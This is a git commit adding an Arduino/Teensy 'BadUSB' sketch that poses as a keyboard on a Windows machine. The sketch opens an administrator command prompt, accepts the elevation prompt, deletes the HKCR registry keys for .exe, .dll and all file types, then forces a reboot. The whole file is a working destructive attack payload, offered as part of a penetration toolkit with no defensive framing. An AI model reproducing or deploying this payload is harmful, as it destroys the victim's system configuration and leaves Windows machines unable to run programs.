189bd10debe3258a0331f8ee045362bc2f1d111d
Edo -maland- <Screetsec@users.noreply.github.com>
2016-11-17 18:02:13 +0700

    Add files via upload

---
+++ src/atckwin/Delete_Registry.ino
@@ -0,0 +1,139 @@
+/*
+Script Edit By : Edo Maland  [ Screetsec ]
+Follow me on : www,github.com/Screetsec
+Penetration OS from Indonesia : Dracos Linux
+Link : www.dracos-linux.org
+Forum : forum.dracos-linux.org
+*/
+
+
+
+int ds = 500;
+
+#if defined(CORE_TEENSY)
+#define LED_PIN 13
+#endif
+
+void setup()
+{
+
+  // allow controlling LED
+  pinMode(LED_PIN, OUTPUT);
+  // turn the LED on while running
+  digitalWrite(LED_PIN, HIGH);
+
+  delay(1000);
+  loop();
+
+  delay(3000);
+  show_desktop();
+
+  delay(3000);
+  cmd_admin();
+
+  delay(3000);
+  send_altyes();
+
+  delay(1000);
+  Keyboard.print("ipconfig");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+
+  delay(1000);
+  Keyboard.print("START reg delete HKCR/.exe");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+
+  delay(1000);
+  Keyboard.print("START reg delete HKCR/.exe");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+
+  delay(1000);
+  Keyboard.print("START reg delete HKCR/.dll");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+
+  delay(1000);
+  Keyboard.print("START reg delete HKCR/*");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+
+
+  delay(1000);
+  Keyboard.print("shutdown -r -f -t 00");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+
+  delay(1000);
+  Keyboard.print("exit");
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+}
+
+
+void show_desktop(){
+  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
+  Keyboard.set_key1(KEY_D);
+  Keyboard.send_now();
+  delay(500);
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+}
+void send_altyes(){
+  delay(1000);
+  Keyboard.set_modifier(MODIFIERKEY_ALT);
+  Keyboard.set_key1(KEY_Y);
+  Keyboard.send_now();
+  delay(100);
+
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+  }
+
+void cmd_admin(){
+  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
+  Keyboard.send_now();
+  delay(1000);
+  Keyboard.set_modifier(0);
+  Keyboard.send_now();
+  delay(2000);
+  Keyboard.print("cmd");
+
+  delay(2000);
+  Keyboard.set_modifier(MODIFIERKEY_CTRL);
+  Keyboard.send_now();
+  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
+  Keyboard.send_now();
+  Keyboard.set_key1(KEY_ENTER);
+  Keyboard.send_now();
+
+  delay(200);
+  Keyboard.set_modifier(0);
+  Keyboard.set_key1(0);
+  Keyboard.send_now();
+}
+
+void loop(){
+    // blink quickly when complete
+  digitalWrite(LED_PIN, HIGH);
+  delay(ds/2);
+  digitalWrite(LED_PIN, LOW);
+  delay(ds/2);
+}
